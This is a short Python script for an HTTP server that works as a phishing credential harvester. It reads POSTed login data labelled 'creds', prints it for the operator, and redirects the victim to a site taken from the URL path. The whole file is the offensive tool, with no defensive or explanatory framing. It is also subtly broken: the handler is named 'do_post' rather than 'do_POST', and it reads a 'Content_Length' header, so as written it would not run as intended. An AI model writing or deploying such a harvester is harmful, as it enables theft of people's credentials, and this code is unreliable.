import http.server
import socketserver
import requests


class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_post(self):
        content_length = int(self.headers['Content_Length'])
        creds = self.rfile.read(content_length).decode("utf-8")
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header("Location",requests.utils.unquote(site))
        self.end_headers()


server = socketserver.TCPServer(("0.0.0.0",8080),CredRequestHandler)
server.serve_forever()

